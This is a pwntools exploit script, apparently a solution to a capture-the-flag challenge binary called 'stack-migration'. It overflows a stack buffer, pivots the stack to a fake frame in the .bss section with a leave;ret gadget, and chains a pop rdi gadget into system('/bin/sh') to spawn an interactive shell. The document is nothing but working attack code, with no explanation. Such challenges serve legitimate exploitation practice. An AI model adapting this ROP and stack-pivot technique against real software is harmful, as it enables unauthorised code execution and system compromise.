#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./stack-migration')
elf = ELF('./stack-migration')

def pr(a,addr):
	log.success(a+': '+hex(addr))

buf = 0x601040
fake_rbp = 0x601900
main_puts_read = 0x4006B0
leave_ret = 0x4006d7
prdi_ret = 0x400743
system_plt = 0x400520

p.recvuntil('Enter your data:\n')
p.send('/bin/sh')

#gdb.attach(p)
#pause()
p.recvuntil('Please pwn me :)\n')
payload1 = 'A'*0x20 + p64(fake_rbp) + p64(main_puts_read)
p.send(payload1)

#main_puts_read
p.recvuntil('Please pwn me :)\n')
payload2 = p64(prdi_ret) + p64(buf) + p64(system_plt) + p64(0) + p64(fake_rbp-0x20-0x8) + p64(leave_ret)
p.send(payload2)

p.interactive()